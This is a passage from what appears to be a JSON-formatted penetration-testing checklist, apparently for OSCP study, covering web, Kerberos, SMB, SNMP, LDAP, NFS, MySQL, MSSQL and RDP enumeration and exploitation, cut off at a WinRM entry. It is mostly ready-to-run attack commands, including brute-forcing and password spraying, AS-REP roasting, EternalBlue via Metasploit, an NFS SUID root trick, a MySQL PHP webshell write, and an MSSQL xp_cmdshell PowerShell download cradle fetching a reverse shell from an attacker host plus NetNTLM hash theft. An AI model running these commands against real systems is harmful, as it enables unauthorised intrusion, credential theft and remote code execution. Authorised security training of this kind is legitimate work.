HTTP methods\nnmap -p 80,443 --script=http-methods <TARGET_IP>\ncurl -X OPTIONS http://<TARGET_IP> -v\n\n# Check for common web files\ncurl -sk http://<TARGET_IP>/robots.txt\ncurl -sk http://<TARGET_IP>/sitemap.xml\ncurl -sk http://<TARGET_IP>/.git/HEAD\ncurl -sk http://<TARGET_IP>/crossdomain.xml"
      }
    ],
    "brief_description": "Fingerprint the web stack completely before testing — framework, CMS, WAF, and TLS version all matter."
  },
  {
    "id": "item-24",
    "phase": "3. Service-Specific Enumeration",
    "step": "3.6 HTTP/HTTPS (80/443/8080/8443/8000/8888)",
    "title": "Directory & file brute-force",
    "feasible_when": "Any HTTP/HTTPS port is open.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# gobuster (workhorse)\ngobuster dir -u http://<TARGET_IP> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak,old,zip,conf,config,json,xml,asp,aspx,jsp -o recon/web/gobuster.txt -t 40\ngobuster dir -u http://<TARGET_IP> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html -o recon/web/gobuster2.txt -k\n\n# feroxbuster (recursive — best for deep enumeration)\nferoxbuster -u http://<TARGET_IP> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,asp,aspx,txt,html,js,json -o recon/web/ferox.txt --auto-tune --depth 3\n\n# ffuf (fastest)\nffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -u http://<TARGET_IP>/FUZZ -o recon/web/ffuf.json -of json\nffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://<TARGET_IP>/FUZZ -mc 200,301,302,401,403 -o recon/web/ffuf_dirs.json\n\n# dirsearch\ndirsearch -u http://<TARGET_IP> -e php,asp,aspx,txt,html,xml,json -o recon/web/dirsearch.txt --format plain\n\n# wfuzz\nwfuzz -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 404,400 http://<TARGET_IP>/FUZZ\n\n# dirb (old but reliable)\ndirb http://<TARGET_IP> /usr/share/wordlists/dirb/common.txt -o recon/web/dirb.txt\n\n# Custom wordlists per CMS\n# WordPress: /usr/share/seclists/Discovery/Web-Content/CMS/wordpress.fuzz.txt\n# Drupal:    /usr/share/seclists/Discovery/Web-Content/CMS/drupal.txt\n# Joomla:    /usr/share/seclists/Discovery/Web-Content/CMS/joomla.txt\n\n# Extension-focused\nffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -u http://<TARGET_IP>/FUZZ.php -mc 200,301,302,403\nffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -u http://<TARGET_IP>/FUZZ.bak -mc 200"
      }
    ],
    "brief_description": "Run multiple tools in parallel — each has different wordlists and logic, they catch different things."
  },
  {
    "id": "item-25",
    "phase": "3. Service-Specific Enumeration",
    "step": "3.6 HTTP/HTTPS (80/443/8080/8443/8000/8888)",
    "title": "Virtual host & subdomain enumeration",
    "feasible_when": "A web server is running and a domain name is known.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# gobuster vhost\ngobuster vhost -u http://<DOMAIN> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -t 50 -o recon/web/vhosts.txt\n\n# ffuf vhost\nffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://<TARGET_IP> -H 'Host: FUZZ.<DOMAIN>' -fs <DEFAULT_SIZE> -o recon/web/vhost_ffuf.json\n\n# wfuzz vhost\nwfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://<TARGET_IP> -H 'Host: FUZZ.<DOMAIN>' --hc 404,400 --hl <DEFAULT_LINES>\n\n# Add all found vhosts to /etc/hosts\necho \"<TARGET_IP> dev.<DOMAIN> admin.<DOMAIN> portal.<DOMAIN>\" | sudo tee -a /etc/hosts\n\n# Check SSL cert SANs for vhosts\nopenssl s_client -connect <TARGET_IP>:443 2>/dev/null | openssl x509 -noout -text | grep 'DNS:'\n\n# curl vhost test\ncurl -H 'Host: admin.<DOMAIN>' http://<TARGET_IP>/\ncurl -H 'Host: dev.<DOMAIN>' http://<TARGET_IP>/ -v"
      }
    ],
    "brief_description": "Virtual hosts can expose admin panels, dev sites, and staging environments not accessible from main domain."
  },
  {
    "id": "item-26",
    "phase": "3. Service-Specific Enumeration",
    "step": "3.6 HTTP/HTTPS (80/443/8080/8443/8000/8888)",
    "title": "Interesting files & exposed secrets",
    "feasible_when": "Any web server is accessible.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# Common sensitive files check\nfor f in robots.txt sitemap.xml .htaccess .htpasswd crossdomain.xml clientaccesspolicy.xml phpinfo.php info.php test.php server-status server-info .env .env.local .env.production web.config backup.zip backup.tar.gz database.sql .DS_Store .git/HEAD; do\n  CODE=$(curl -sk -o /dev/null -w '%{http_code}' http://<TARGET_IP>/$f)\n  [ \"$CODE\" != \"404\" ] && echo \"[+] $CODE: $f\"\ndone\n\n# Git repo exposure\ncurl -sk http://<TARGET_IP>/.git/HEAD\ngit-dumper http://<TARGET_IP>/.git/ ./loot/git_dump/\ntrufflehog filesystem ./loot/git_dump/  # find secrets in git history\n\n# SVN exposure\ncurl -sk http://<TARGET_IP>/.svn/entries\n\n# Backup file naming patterns\nfor ext in bak old orig backup~ .bak.1 .old.1 _backup _old; do\n  curl -sk -o /dev/null -w \"$ext: %{http_code}\\n\" http://<TARGET_IP>/index.php$ext\ndone\n\n# Config/env leaks\ncurl -sk http://<TARGET_IP>/.env | head -30\ncurl -sk http://<TARGET_IP>/config.php.bak | head -30\ncurl -sk http://<TARGET_IP>/wp-config.php.bak | head -30\ncurl -sk http://<TARGET_IP>/database.yml | head -30\ncurl -sk http://<TARGET_IP>/settings.py | head -30\ncurl -sk http://<TARGET_IP>/config/database.yml | head -30\n\n# API key exposure\ncurl -sk http://<TARGET_IP>/api/swagger.json\ncurl -sk http://<TARGET_IP>/api/v1/swagger.json\ncurl -sk http://<TARGET_IP>/openapi.json\ncurl -sk http://<TARGET_IP>/v2/api-docs\ncurl -sk http://<TARGET_IP>/.well-known/security.txt\n\n# DS_Store parser (macOS artifacts)\npython3 dsstore_parser.py http://<TARGET_IP>/.DS_Store"
      }
    ],
    "brief_description": "Exposed git repos, .env files, backups, and swagger docs are high-value — always check before exploiting."
  },
  {
    "id": "item-27",
    "phase": "3. Service-Specific Enumeration",
    "step": "3.6 HTTP/HTTPS (80/443/8080/8443/8000/8888)",
    "title": "Parameter & API endpoint fuzzing",
    "feasible_when": "A web application is present with pages accepting GET or POST parameters.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# arjun — parameter discovery\narjun -u http://<TARGET_IP>/page -m GET -o recon/web/arjun_get.json\narjun -u http://<TARGET_IP>/page -m POST -o recon/web/arjun_post.json\n\n# ffuf parameter\nffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://<TARGET_IP>/page?FUZZ=test' -fs <DEFAULT_SIZE>\nffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://<TARGET_IP>/page -X POST -d 'FUZZ=test' -fs <DEFAULT_SIZE>\n\n# wfuzz\nwfuzz -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hc 404 'http://<TARGET_IP>/page?FUZZ=test'\n\n# API enumeration\ngobuster dir -u http://<TARGET_IP>/api -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -t 40\nffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -u http://<TARGET_IP>/api/FUZZ\n\n# GraphQL endpoint detection\ncurl -sk http://<TARGET_IP>/graphql -d '{\"query\":\"{__schema{types{name}}}'}' -H 'Content-Type: application/json'\ncurl -sk http://<TARGET_IP>/api/graphql -d '{\"query\":\"{ __typename }\"}' -H 'Content-Type: application/json'\nfor ep in graphql graphiql api/graphql v1/graphql query; do\n  CODE=$(curl -sk -o /dev/null -w '%{http_code}' http://<TARGET_IP>/$ep)\n  [ \"$CODE\" != \"404\" ] && echo \"[+] $CODE: $ep\"\ndone"
      }
    ],
    "brief_description": "Hidden parameters and API endpoints can expose injection points, authentication bypasses, or sensitive data."
  },
  {
    "id": "item-28",
    "phase": "3. Service-Specific Enumeration",
    "step": "3.6 HTTP/HTTPS (80/443/8080/8443/8000/8888)",
    "title": "CMS enumeration",
    "feasible_when": "A CMS is detected via technology fingerprinting.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# WordPress\nwpscan --url http://<TARGET_IP> -e ap,at,u,cb,dbe --api-token <TOKEN> -o recon/web/wpscan.txt\nwpscan --url http://<TARGET_IP> --enumerate u  # users only\nwpscan --url http://<TARGET_IP> --enumerate p --plugins-detection aggressive\nwpscan --url http://<TARGET_IP> --passwords /usr/share/wordlists/rockyou.txt --usernames <USER>\ncurl -s http://<TARGET_IP>/wp-json/wp/v2/users | python3 -m json.tool | grep 'name\\|slug'\n\n# Drupal\ndroopescan scan drupal -u http://<TARGET_IP> -t 32\nnmap -p 80 --script=http-drupal-enum <TARGET_IP>\ncurl -s http://<TARGET_IP>/CHANGELOG.txt | head -5  # reveals version\ncurl -s http://<TARGET_IP>/node/1  # default node\n\n# Joomla\njoomscan -u http://<TARGET_IP> -ec --output recon/web/joomscan.txt\ncurl -s http://<TARGET_IP>/administrator/manifests/files/joomla.xml | grep '<version>'\n\n# Magento\nmagescan scan:all http://<TARGET_IP>\ncurl -s http://<TARGET_IP>/magento_version\n\n# SharePoint / IIS\nnmap -p 80,443 --script='http-iis-webdav-vuln,http-iis-short-name-brute' <TARGET_IP>\ncurl -s http://<TARGET_IP>/_vti_inf.html\ncurl -X OPTIONS http://<TARGET_IP> -v 2>&1 | grep Allow:\n\n# Tomcat\ncurl -s http://<TARGET_IP>:8080/manager/html  # default manager\nnmap -p 8080 --script='http-tomcat-manager,http-default-accounts' <TARGET_IP>\n\n# Jenkins\ncurl -s http://<TARGET_IP>:8080/login\nnmap -p 8080 --script=http-jenkins-info <TARGET_IP>"
      }
    ],
    "brief_description": "CMS-specific scanners find vulnerable plugins/themes and user accounts — always enumerate after fingerprinting."
  },

  // --- Kerberos (88) ---
  {
    "id": "item-29",
    "phase": "3. Service-Specific Enumeration",
    "step": "3.7 Kerberos (88)",
    "title": "User enumeration, AS-REP Roasting & password spraying",
    "feasible_when": "port 88 is open — Active Directory / Domain Controller environment.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# kerbrute — stealthy user enum (no credentials needed)\nkerbrute userenum -d <DOMAIN> --dc <TARGET_IP> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -o recon/kerberos/kerbrute_users.txt\nkerbrute userenum -d <DOMAIN> --dc <TARGET_IP> /usr/share/seclists/Usernames/Names/names.txt\n\n# nmap Kerberos user enum\nnmap -p 88 --script='krb5-enum-users' --script-args=\"krb5-enum-users.realm=<DOMAIN>,userdb=/usr/share/seclists/Usernames/Names/names.txt\" <TARGET_IP>\n\n# AS-REP Roasting (no pre-auth users)\nimpacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -dc-ip <TARGET_IP> -format hashcat -outputfile recon/kerberos/asrep.txt\nimpacket-GetNPUsers <DOMAIN>/ -no-pass -dc-ip <TARGET_IP>  # anonymous attempt\n\n# Crack AS-REP\nhashcat -m 18200 recon/kerberos/asrep.txt /usr/share/wordlists/rockyou.txt --force\njohn --wordlist=/usr/share/wordlists/rockyou.txt recon/kerberos/asrep.txt\n\n# Kerberos password spray (avoids lockout)\nkerbrute passwordspray -d <DOMAIN> --dc <TARGET_IP> users.txt '<PASSWORD>'\n\n# Brute Kerberos\nkerbrute bruteuser -d <DOMAIN> --dc <TARGET_IP> /usr/share/wordlists/rockyou.txt <USER>"
      }
    ],
    "brief_description": "Kerberos user enum is stealthy — doesn't generate traditional failed login events. Always run on port 88."
  },

  // --- SMB (139/445) ---
  {
    "id": "item-30",
    "phase": "3. Service-Specific Enumeration",
    "step": "3.8 SMB/NetBIOS (139/445)",
    "title": "Null session & unauthenticated enumeration",
    "feasible_when": "port 445 or port 139 is open.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# smbclient (null session)\nsmbclient -L //<TARGET_IP> -N\nsmbclient -L //<TARGET_IP> -U ''\nsmbclient -L //<TARGET_IP> -U 'guest%'\n\n# CrackMapExec\ncrackmapexec smb <TARGET_IP> -u '' -p '' --shares\ncrackmapexec smb <TARGET_IP> -u '' -p '' --users\ncrackmapexec smb <TARGET_IP> -u 'guest' -p '' --shares\ncrackmapexec smb <TARGET_IP>  # just banner grab\n\n# enum4linux-ng (comprehensive)\nenum4linux-ng -A <TARGET_IP> -oA recon/smb/enum4linux\nenum4linux -a <TARGET_IP> | tee recon/smb/enum4linux_old.txt\n\n# smbmap\nsmbmap -H <TARGET_IP> -u '' -p ''\nsmbmap -H <TARGET_IP> -u 'guest' -p ''\n\n# nmap scripts\nnmap -p 139,445 --script='smb-enum-shares,smb-enum-users,smb-os-discovery,smb-security-mode,smb-enum-domains,smb-enum-groups,smb-system-info,smb-ls,smb2-capabilities' <TARGET_IP>\n\n# rpcclient\nrpcclient -U '' -N <TARGET_IP> -c 'enumdomusers; enumdomgroups; srvinfo; querydominfo; netshareenum'\nrpcclient -U '' -N <TARGET_IP> << 'EOF'\nenumdomusers\nenumdomgroups\nquerydominfo\nlookupnames administrator\nEOF\n\n# NetBIOS info\nnbtscan <TARGET_IP>\nnbtscan -r <NETWORK_CIDR>"
      }
    ],
    "brief_description": "SMB null sessions reveal domain users, groups, and share names — try multiple tools as they catch different things."
  },
  {
    "id": "item-31",
    "phase": "3. Service-Specific Enumeration",
    "step": "3.8 SMB/NetBIOS (139/445)",
    "title": "Authenticated share enumeration & file spider",
    "feasible_when": "port 445 is open and valid SMB credentials are available.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# smbclient\nsmbclient //<TARGET_IP>/<SHARE> -U '<USER>%<PASS>'\n  ls\n  recurse on\n  prompt off\n  mget *\n  get <FILE>\n  put <FILE>\n\n# smbmap recursive\nsmbmap -H <TARGET_IP> -u <USER> -p <PASS> -R --depth 5\nsmbmap -H <TARGET_IP> -u <USER> -p <PASS> -r <SHARE> --depth 10\nsmbmap -H <TARGET_IP> -u <USER> -p <PASS> -A '.*\\.txt|.*\\.cfg|.*\\.config|.*\\.xml|.*\\.ini|.*\\.kdbx|.*\\.bat|.*\\.ps1'\n\n# CrackMapExec spider\ncrackmapexec smb <TARGET_IP> -u <USER> -p <PASS> --shares\ncrackmapexec smb <TARGET_IP> -u <USER> -p <PASS> -M spider_plus -o OUTPUT_FOLDER=./loot/smb_spider\n\n# impacket-smbclient\nimpacket-smbclient '<USER>:<PASS>@<TARGET_IP>'\n\n# Mount share (download everything)\nmkdir -p /mnt/smb_<SHARE>\nmount -t cifs //<TARGET_IP>/<SHARE> /mnt/smb_<SHARE> -o user=<USER>,password=<PASS>,vers=3.0\ncp -r /mnt/smb_<SHARE>/ ~/oscp/<TARGET_IP>/loot/\n\n# Windows mount\nnet use Z: \\\\<TARGET_IP>\\<SHARE> /user:<USER> <PASS>\n\n# Search mounted share for goodies\ngrep -ri 'password\\|passwd\\|secret\\|credential\\|api_key\\|token' /mnt/smb_<SHARE>/ 2>/dev/null\nfind /mnt/smb_<SHARE>/ -name '*.kdbx' -o -name '*.pfx' -o -name '*.key' -o -name '*.pem'"
      }
    ],
    "brief_description": "Spider every accessible SMB share — credentials in scripts, configs, and Office documents are common."
  },
  {
    "id": "item-32",
    "phase": "3. Service-Specific Enumeration",
    "step": "3.8 SMB/NetBIOS (139/445)",
    "title": "SMB vulnerability scan",
    "feasible_when": "port 445 is open — especially relevant on older Windows systems.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# All SMB vuln scripts\nnmap -p 445 --script='smb-vuln*' <TARGET_IP>\n\n# EternalBlue — MS17-010 (Windows 7/2008)\nnmap -p 445 --script=smb-vuln-ms17-010 <TARGET_IP>\n# Exploit:\nmsf: use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS <TARGET_IP>; set LHOST <ATTACKER_IP>; run\n# Manual: python3 zzz_exploit.py <TARGET_IP>\n\n# MS08-067 (Windows XP/2003)\nnmap -p 445 --script=smb-vuln-ms08-067 <TARGET_IP>\n\n# EternalRomance MS17-010 SMB1\nnmap -p 445 --script=smb-vuln-ms17-010 <TARGET_IP>\n\n# SMB signing check (relay possibility)\nnmap -p 445 --script=smb-security-mode <TARGET_IP>\ncrackmapexec smb <TARGET_IP> --gen-relay-list relay_targets.txt\ncrackmapexec smb <NETWORK_CIDR> --gen-relay-list recon/smb/relay_targets.txt\n\n# SMBGhost CVE-2020-0796 (Windows 10/Server 2019)\nnmap -p 445 --script=smb-vuln-cve-2020-0796 <TARGET_IP>\n\n# Zerologon CVE-2020-1472 (Domain Controllers)\npython3 zerologon_check.py <DC_NAME> <TARGET_IP>\n\n# PrintNightmare check\nimpacket-rpcdump <TARGET_IP> | grep -i 'spoolsv\\|spooler'"
      }
    ],
    "brief_description": "EternalBlue and MS08-067 give instant SYSTEM on unpatched Windows — always check signing status for relay attacks."
  },

  // --- SNMP (161 UDP) ---
  {
    "id": "item-33",
    "phase": "3. Service-Specific Enumeration",
    "step": "3.9 SNMP (161/162 UDP)",
    "title": "SNMP community string brute-force & MIB walk",
    "feasible_when": "UDP port 161 is open.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# Community string brute-force\nonesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt <TARGET_IP>\nhydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt snmp://<TARGET_IP>\nnmap -sU -p 161 --script=snmp-brute --script-args='snmp-brute.communitiesdb=/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt' <TARGET_IP>\n\n# Full walk\nsnmpwalk -v2c -c public <TARGET_IP>\nsnmpwalk -v1 -c public <TARGET_IP>\nsnmpwalk -v2c -c private <TARGET_IP>\nsnmpbulkwalk -v2c -c public <TARGET_IP>\n\n# snmp-check (parsed human-readable output)\nsnmp-check <TARGET_IP> -c public -v 2c -d\n\n# Specific OIDs\nsnmpwalk -v2c -c public <TARGET_IP> 1.3.6.1.4.1.77.1.2.25      # Windows users\nsnmpwalk -v2c -c public <TARGET_IP> 1.3.6.1.2.1.25.4.2.1.2     # running processes\nsnmpwalk -v2c -c public <TARGET_IP> 1.3.6.1.2.1.25.6.3.1.2     # installed software\nsnmpwalk -v2c -c public <TARGET_IP> 1.3.6.1.2.1.6.13.1.3       # TCP ports\nsnmpwalk -v2c -c public <TARGET_IP> 1.3.6.1.2.1.1               # system info\nsnmpwalk -v2c -c public <TARGET_IP> 1.3.6.1.2.1.4.34            # IP addresses\nsnmpwalk -v2c -c public <TARGET_IP> 1.3.6.1.4.1.77.1.2.3        # share names\n\n# nmap SNMP scripts\nnmap -sU -p 161 --script='snmp-info,snmp-interfaces,snmp-netstat,snmp-processes,snmp-sysdescr,snmp-win32-services,snmp-win32-users,snmp-win32-shares' <TARGET_IP>\n\n# SNMP extended commands (RCE potential)\nsnmpwalk -v2c -c public <TARGET_IP> NET-SNMP-EXTEND-MIB::nsExtendOutputFull"
      }
    ],
    "brief_description": "SNMP 'public' community string reveals users, running processes, installed software — critical for AD environments."
  },

  // --- LDAP (389/636) ---
  {
    "id": "item-34",
    "phase": "3. Service-Specific Enumeration",
    "step": "3.10 LDAP (389/636)",
    "title": "Anonymous & authenticated LDAP enumeration",
    "feasible_when": "port 389 or 636 is open — common on Domain Controllers.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# Get base DN / root DSE\nldapsearch -x -H ldap://<TARGET_IP> -s base namingcontexts\nldapsearch -x -H ldap://<TARGET_IP> -b '' -s base '(objectClass=*)' '*' +\n\n# Anonymous bind enumeration\nldapsearch -x -H ldap://<TARGET_IP> -b 'dc=<DC>,dc=<TLD>'\nldapsearch -x -H ldap://<TARGET_IP> -b 'dc=<DC>,dc=<TLD>' '(objectClass=user)' sAMAccountName userPrincipalName description\nldapsearch -x -H ldap://<TARGET_IP> -b 'dc=<DC>,dc=<TLD>' '(objectClass=group)' cn member\nldapsearch -x -H ldap://<TARGET_IP> -b 'dc=<DC>,dc=<TLD>' '(objectClass=computer)' dNSHostName operatingSystem\n\n# Authenticated dump\nldapsearch -x -H ldap://<TARGET_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'dc=<DC>,dc=<TLD>' '(objectClass=user)' | tee recon/ldap/users.txt\n\n# ldapdomaindump (comprehensive HTML/JSON output)\nldapdomaindump -u '<DOMAIN>\\<USER>' -p '<PASS>' <TARGET_IP> -o recon/ldap/\n\n# nmap LDAP scripts\nnmap -p 389,636 --script='ldap-rootdse,ldap-search,ldap-brute' <TARGET_IP>\n\n# windapsearch\nwindapsearch --dc <TARGET_IP> -u '<USER>@<DOMAIN>' -p '<PASS>' --users --full\nwindapsearch --dc <TARGET_IP> -u '<USER>@<DOMAIN>' -p '<PASS>' --groups\nwindapsearch --dc <TARGET_IP> -u '<USER>@<DOMAIN>' -p '<PASS>' --da  # domain admins\n\n# Search for interesting attributes\nldapsearch -x -H ldap://<TARGET_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'dc=<DC>,dc=<TLD>' '(description=*password*)'\nldapsearch -x -H ldap://<TARGET_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'dc=<DC>,dc=<TLD>' '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'  # no pre-auth"
      }
    ],
    "brief_description": "LDAP anonymous bind is common on AD — dumps all users, groups, and computers. Check description fields for passwords."
  },

  // --- NFS (2049) ---
  {
    "id": "item-35",
    "phase": "3. Service-Specific Enumeration",
    "step": "3.11 NFS (2049)",
    "title": "NFS exports enumeration & mounting",
    "feasible_when": "port 2049 is open or port 111 (RPCBind) lists NFS.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# Enumerate exports\nshowmount -e <TARGET_IP>\nnmap -p 111,2049 --script='nfs-ls,nfs-showmount,nfs-statfs,rpcinfo' <TARGET_IP>\nrpcinfo -p <TARGET_IP>\n\n# Mount NFS share\nmkdir -p /mnt/nfs\nmount -t nfs <TARGET_IP>:/<SHARE> /mnt/nfs -o nolock\nmount -t nfs4 <TARGET_IP>:/<SHARE> /mnt/nfs\nls -la /mnt/nfs\n\n# Check permissions on mounted share\nid  # note UID/GID\nls -lan /mnt/nfs  # numeric UID display\n\n# UID impersonation (match target user UID)\ncat /mnt/nfs/etc/passwd 2>/dev/null || ls /mnt/nfs/home/\nsudo useradd -u <TARGET_UID> tempuser\nsudo su tempuser\nls /mnt/nfs/<USER_DIR>/\n\n# no_root_squash exploitation\n# On attacker — if no_root_squash is set\nmount -t nfs <TARGET_IP>:/<SHARE> /mnt/nfs -o nolock\ncp /bin/bash /mnt/nfs/rootbash\nchmod 4777 /mnt/nfs/rootbash  # set SUID\n# On target:\n<SHARE>/rootbash -p\n\n# Cleanup\numount /mnt/nfs"
      }
    ],
    "brief_description": "NFS with no_root_squash = instant root. Always check exports and mount permissions before anything else."
  },

  // --- MySQL (3306) ---
  {
    "id": "item-36",
    "phase": "3. Service-Specific Enumeration",
    "step": "3.12 MySQL (3306)",
    "title": "MySQL enumeration & exploitation",
    "feasible_when": "port 3306 is open.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# Try common credentials\nmysql -h <TARGET_IP> -u root -p\nmysql -h <TARGET_IP> -u root --password=''\nmysql -h <TARGET_IP> -u root --password='root'\nmysql -h <TARGET_IP> -u root --password='toor'\nmysql -h <TARGET_IP> -u root --password='mysql'\nmysql -h <TARGET_IP> -u admin --password='admin'\n\n# nmap scripts\nnmap -p 3306 --script='mysql-info,mysql-enum,mysql-empty-password,mysql-dump-hashes,mysql-databases,mysql-users,mysql-audit' <TARGET_IP>\n\n# Brute-force\nhydra -L users.txt -P /usr/share/wordlists/rockyou.txt mysql://<TARGET_IP> -t 4\nmedusa -h <TARGET_IP> -U users.txt -P passwords.txt -M mysql\n\n# If logged in\nmysql -h <TARGET_IP> -u root --password='<PASS>' << 'EOF'\nshow databases;\nuse mysql;\nselect user,host,authentication_string,plugin from user;\nshow grants for root@localhost;\nselect @@global.secure_file_priv;\nselect load_file('/etc/passwd');\nselect '<?php system($_GET[\"cmd\"]);?>' into outfile '/var/www/html/cmd.php';\nEOF\n\n# UDF exploitation (MySQL → RCE)\nselect @@plugin_dir;  # find plugin directory\n# Compile raptor_udf or lib_mysqludf_sys and upload\n# https://www.exploit-db.com/exploits/1518"
      }
    ],
    "brief_description": "MySQL root with blank password is common — load_file() reads system files, INTO OUTFILE writes webshells."
  },

  // --- MSSQL (1433) ---
  {
    "id": "item-37",
    "phase": "3. Service-Specific Enumeration",
    "step": "3.13 MSSQL (1433)",
    "title": "MSSQL enumeration & RCE",
    "feasible_when": "port 1433 is open.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# impacket-mssqlclient\nimpacket-mssqlclient <DOMAIN>/<USER>:<PASS>@<TARGET_IP> -windows-auth\nimpacket-mssqlclient sa:<PASS>@<TARGET_IP>\nimpacket-mssqlclient sa:@<TARGET_IP>  # blank password\n\n# nmap scripts\nnmap -p 1433 --script='ms-sql-info,ms-sql-config,ms-sql-empty-password,ms-sql-hasdbaccess,ms-sql-tables,ms-sql-dump-hashes,ms-sql-xp-cmdshell' <TARGET_IP>\n\n# CrackMapExec\ncrackmapexec mssql <TARGET_IP> -u <USER> -p <PASS> --local-auth\ncrackmapexec mssql <TARGET_IP> -u sa -p '' --local-auth\ncrackmapexec mssql <TARGET_IP> -u <USER> -p <PASS> -q 'SELECT name FROM master.dbo.sysdatabases'\n\n# Enable xp_cmdshell (once connected)\nEXEC sp_configure 'show advanced options', 1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;\nEXEC xp_cmdshell 'whoami';\nEXEC xp_cmdshell 'powershell -c \"IEX(New-Object Net.WebClient).DownloadString(''http://<ATTACKER_IP>/rev.ps1'')'\";\n\n# Linked server execution\nSELECT * FROM OPENROWSET('SQLNCLI', 'server=<LINKED_SRV>;trusted_connection=yes', 'exec xp_cmdshell ''whoami''')\nEXEC ('xp_cmdshell ''whoami''') AT [<LINKED_SERVER>];\n\n# Steal NetNTLM hash\nEXEC xp_dirtree '\\\\<ATTACKER_IP>\\share';  -- responder catches it\nEXEC xp_fileexist '\\\\<ATTACKER_IP>\\share\\test';\n\n# UNC path file read\nSELECT BulkColumn FROM OPENROWSET(BULK 'C:\\Windows\\System32\\drivers\\etc\\hosts', SINGLE_CLOB) MyFile;"
      }
    ],
    "brief_description": "MSSQL sa with blank password is common. xp_cmdshell gives OS command execution. Steal hashes via xp_dirtree."
  },

  // --- RDP (3389) ---
  {
    "id": "item-38",
    "phase": "3. Service-Specific Enumeration",
    "step": "3.14 RDP (3389)",
    "title": "RDP enumeration, brute-force & connection",
    "feasible_when": "port 3389 is open.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# nmap\nnmap -p 3389 --script='rdp-enum-encryption,rdp-vuln-ms12-020,rdp-enum-users' <TARGET_IP>\n\n# Brute-force (slow — 1 thread to avoid lockout)\ncrowbar -b rdp -s <TARGET_IP>/32 -U users.txt -C passwords.txt -n 1\nhydra -L users.txt -P passwords.txt rdp://<TARGET_IP> -t 1 -V\ncrackmapexec rdp <TARGET_IP> -u users.txt -p passwords.txt\n\n# Connect\nxfreerdp /v:<TARGET_IP> /u:<USER> /p:<PASS> /cert:ignore +clipboard /dynamic-resolution /drive:share,/tmp/share\nxfreerdp /v:<TARGET_IP> /u:<USER> /p:<PASS> /d:<DOMAIN> /cert:ignore +clipboard\nrdesktop <TARGET_IP> -u <USER> -p <PASS> -d <DOMAIN>\n\n# Pass-the-Hash RDP\nxfreerdp /v:<TARGET_IP> /u:<USER> /pth:<NTLM_HASH> /cert:ignore\n# Note: Requires DisableRestrictedAdmin=0 or Restricted Admin mode enabled\n\n# Enable restricted admin mode on target\nreg add 'HKLM\\System\\CurrentControlSet\\Control\\Lsa' /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f\n\n# BlueKeep check CVE-2019-0708\nnmap -p 3389 --script=rdp-vuln-ms12-020 <TARGET_IP>\nmsf: use auxiliary/scanner/rdp/cve_2019_0708_bluekeep\n\n# DejaBlue check CVE-2019-1182/1222\nnmap -p 3389 --script='rdp-*' <TARGET_IP>"
      }
    ],
    "brief_description": "RDP brute-force: use 1 thread to avoid lockout. Pass-the-hash works with restricted admin mode enabled."
  },

  // --- WinRM (5985/5986) ---
  {
    "id": "item-39",
    "phase": "3. Service-Specific Enumeration",
    "step": "3.15 WinRM (5985/5986)",
    "title": "WinRM access & exploitation",
    "feasible_when": "port 5985 or 5986 is open and valid Windows credentials are available.",
    "snippets": [
      {
        "lang": "bash",
